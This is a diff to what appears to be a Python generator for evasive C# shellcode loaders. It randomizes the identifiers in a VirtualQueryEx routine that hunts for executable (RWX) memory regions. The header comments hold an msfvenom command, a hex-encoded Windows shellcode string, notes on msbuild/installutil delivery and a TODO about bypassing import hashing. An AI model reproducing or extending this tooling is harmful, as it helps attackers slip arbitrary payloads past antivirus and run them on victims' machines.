@@ -5,9 +5,9 @@
 # TODO: more options info, ie. cant use (-a with -m) or (-a with -i) etc...
 # TODO: HostHeaders/SSL...
 # TODO: dll option?
+# TODO: fix virtualquary to support x64 address (still works fyi)
 # TODO: Bypass import hashing...
 # TODO: Have someone cleanup my shit code
-# TODO: fix virtualquary to support x64 address (still works fyi)
 # ProTip: msbuild/installutil will NOT support x64 payloads
 # ./msfvenom -p windows/msgbox -f hex
 # shellcode = d9eb9bd97424f431d2b27731c9648b71308b760c8b761c8b46088b7e208b36384f1875f35901d1ffe1608b6c24248b453c8b54287801ea8b4a188b5a2001ebe334498b348b01ee31ff31c0fcac84c07407c1cf0d01c7ebf43b7c242875e18b5a2401eb668b0c4b8b5a1c01eb8b048b01e88944241c61c3b20829d489e589c2688e4e0eec52e89fffffff894504bb7ed8e273871c2452e88effffff894508686c6c20416833322e64687573657230db885c240a89e656ff550489c250bba8a24dbc871c2452e85fffffff686f7858206861676542684d65737331db885c240a89e36858202020684d53462168726f6d20686f2c20666848656c6c31c9884c241089e131d252535152ffd031c050ff5508
@@ -202,10 +202,10 @@ def virtualquary_class(HuntForAddress):
     ret += " do {"
     ret += " %s %s;\n" % (Memory_Basic_Information, mbi)
     ret += " int %s = VirtualQueryEx(System.Diagnostics.Process.GetCurrentProcess().Handle, (IntPtr)%s, out %s, (uint)Marshal.SizeOf(typeof(%s)));\n" % (result, address, mbi, Memory_Basic_Information)
-    ret += " if (%s.AllocationProtect == 0x00000040)\n" % (mbi)
-    ret += " { return (UInt32)%s.BaseAddress;}\n" % (mbi)
-    ret += " if (%s == (long)%s.BaseAddress + (long)%s.RegionSize) break;\n" %(address, mbi, mbi)
-    ret += " %s = (long)%s.BaseAddress + (long)%s.RegionSize;\n" % (address, mbi, mbi)
+    ret += " if (%s.%s == 0x00000040)\n" % (mbi, AllocationProtect)
+    ret += " { return (UInt32)%s.%s;}\n" % (mbi, BaseAddress)
+    ret += " if (%s == (long)%s.%s + (long)%s.%s) break;\n" %(address, mbi, BaseAddress, mbi, RegionSize)
+    ret += " %s = (long)%s.%s + (long)%s.%s;\n" % (address, mbi, BaseAddress, mbi, RegionSize)
     ret += " } while (%s <= %s);\n" % (address, MaxAddress)
     ret += " return 0; }\n"
     return ret
